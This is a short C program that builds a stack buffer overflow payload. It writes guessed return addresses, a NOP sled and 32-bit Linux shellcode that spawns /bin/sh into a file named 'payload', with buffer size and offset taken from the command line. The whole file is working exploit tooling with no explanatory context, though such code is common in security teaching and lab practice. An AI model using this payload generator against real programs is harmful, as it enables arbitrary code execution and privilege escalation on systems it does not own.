#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>

#define DEFAULT_OFFSET	0
#define DEFAULT_BSIZE	128

#define NOP				0x90

const char scode[] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

unsigned long get_sp(void){
	__asm__("movl	%esp,%eax");
}

void main(int argc, char *argv[]){
	char *buff, *ptr;
	long *addr_ptr, addr;
	int i, offset = DEFAULT_OFFSET, bsize = DEFAULT_BSIZE;
	FILE *payload;
	
	if(argc > 1) bsize = atoi(argv[1]);
	if(argc > 2) offset = atoi(argv[2]);
	
	if(!(buff = malloc(sizeof(char)*bsize))){
		printf("Could not allocate memory.\n");
		exit(0);
	}
	
	addr = get_sp() - offset;
	printf("addr: 0x%08x\n", addr);
	
	ptr = buff;
	addr_ptr = (long *)ptr;
	
	for(i = 0; i < bsize; i += 4)
		*(addr_ptr++) = addr;
		
	for(i = 0; i < bsize/2; i++)
		buff[i] = NOP;
		
	ptr = buff + ((bsize/2) - (strlen(scode)/2));
		
	for(i = 0; i < strlen(scode); i++)
		*(ptr++) = scode[i];
	
	//buff[bsize-1] = '\0';
	
	payload = fopen("payload", "w");
	fwrite(buff, bsize, 1, payload);
	fclose(payload);
	
	free(buff);
}
